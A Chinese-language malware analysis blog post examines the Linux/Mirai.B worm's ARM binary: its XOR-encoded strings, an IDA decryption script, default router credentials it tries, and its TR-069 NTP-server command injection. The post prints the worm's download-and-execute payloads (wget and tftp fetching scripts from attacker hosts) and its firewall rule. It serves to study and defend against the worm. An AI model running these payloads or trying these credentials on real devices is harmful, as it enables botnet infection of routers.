分析Linux/Mirai.B蠕虫

Sam • 2016年12月12日 • 系统安全 • 阅读 1334

最近，Mirai（物联网僵尸网络病毒）的一个变种病毒袭击了德国电信，近900000客户不能上网。有趣的是，恶意软件的意图不是使这些路由器崩溃，而是使用恶意TR-069消息在僵尸网络注册，但恶意软件中的编码错误导致一些调制解调器失败，而不是运行漏洞利用代码。

FortiGuard团队发布了这个变种病毒的杀毒AV签名，命名为Linux/Mirai.B!worm

几个二进制文件被发现在不同的架构中，本篇文章会检查其中一个ARM。

查看二进制文件中的字符串揭示了以下内容：

1、许多加密字符串

2、一个关闭7547端口的命令

busybox iptables -A INPUT -p tcp --destination-port 7547 -j DROP

3、字符串/bin/sh

加密字符串

加密的字符串看起来和Linux/Mirai的源代码相似。

在scanner.c中，我们看到：

add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);            // root     xc3511
add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                    // root     vizxv

其中“504D4D56”就是“PMMV”，就像我们注意到的第一个加密字符串。 “544B585A54”也是比较熟悉的，并且对应于“TKXZT”。

因此，它可能使用相同的“加密算法”， 函数add_auth_entry调用deobf，deobf和0xDE执行XOR运算，然后是0xAD、0xBE、0xEF。

在代码中，我发现了解密函数：

放大：

与0xDEADBEEF的异或等效于与0x22的异或。 因此，我写了一个非常基本的IDA Pro脚本来应用到给定的地址。

static decrypt(from, size ) { 
  auto i, x;           // we define the variables
  for ( i=0; i < size; i=i+1 ) { 
    x = Byte(from);    // fetch the byte
    x = (x^0x22);       // decrypt it
    PatchByte(from,x); // put it back
    from = from + 1;   // next byte
  } 
}

在这里，我们看到该蠕虫会对一些典型的用户名/密码尝试猜解： root/xc3511、 root vizxv、root/admin。我们还看到远程主机的名称，如rep.securityupdate.us和ntp.timeserver.host。我们还可以看到各种其他恶意软件的字符串，这些字符串是Mirai为了’sanitize’设备。

  • .anime：检测Anime恶意软件
  • REPORT％s：％s和HTTPFLOOD用于检测QBot
  • LOLNOGTFO和GETLOCALIP：检测来自LizardSquad僵尸网络的感染

我们还发现来源引擎查询字符串，其中涉及Valve Software协议的在线游戏服务器的间接拒绝服务攻击。这个想法是查询游戏服务器并让它向攻击者想要DoS的一方发送未经请求的信息。

SOAP在哪里？

Mirai.B利用一些使用TR-069协议的路由器或调制解调器的漏洞。在Linux /Mirai.B的描述说明，该协议用于管理路由器和调制解调器。特别地，您可以POST到它XML SOAP以指定要使用的新NTP服务器并自动同步时间。不幸的是，在某些情况下，这个命令的实现是脆弱的，并允许代码执行。 Linux/Mirai.B不指定新的NTP服务器的名称，而是指定命令行，例如：

`cd /tmp;wget http://l.ocalhost.host/2;chmod 777 2;./2`

那它在我们的二进制文件的哪里？ 它在解密的字符串！

在我们的二进制的中，命令如下：

cd /tmp; wget http://p.ocalhost.host/x.sh; chmod 777 x.sh; ./x.sh

或者：

cd /tmp; tftp -l y.sh -r tftp.sh -g p.ocalhost.host; chmod 777 y.sh; ./y.sh

第一个命令使用wget（HTTP），从远程主机下载x.sh并设置可执行权限，并执行x.sh。第二个命令执行相同，但使用TFTP。 文件x.sh或y.sh变成二进制文件，例如我分析的文件。

清除本身

二进制的反汇编显示了一个例程，它调用/bin/sh -c执行一个给定的命令

检查交叉引用，此例程调用字符串busybox iptables -A INPUT -p tcp –destination-port 7547 -j DROP，此命令修改主机的防火墙以阻止对应于TR-069协议的端口7547上的传入连接。换句话说，恶意软件确保其主机不能重复感染两次。
